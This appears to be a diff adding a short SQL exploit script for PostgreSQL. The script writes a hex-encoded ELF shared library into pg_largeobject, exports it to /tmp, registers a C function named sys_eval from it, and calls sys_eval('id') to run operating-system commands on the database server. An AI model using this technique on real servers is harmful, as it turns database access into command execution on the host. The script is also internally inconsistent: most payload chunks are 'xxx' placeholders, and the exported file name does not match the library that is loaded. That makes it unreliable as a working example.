@@ -1,0 +1,15 @@
+SELECT lo_create(9023);
+
+insert into pg_largeobject values (9023, 0, decode('7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e0020000000000000000200000000000020000000600', 'hex'));
+insert into pg_largeobject values (9023, 1, decode('xxx', 'hex'));
+insert into pg_largeobject values (9023, 2, decode('xxx', 'hex'));
+insert into pg_largeobject values (9023, 3, decode('xxx', 'hex'));
+insert into pg_largeobject values (9023, 4, decode('xxx', 'hex'));
+insert into pg_largeobject values (9023, 5, decode('xxx', 'hex'));
+
+SELECT lo_export(9023, '/tmp/testeval.so');
+
+
+CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
+
+select sys_eval('id');
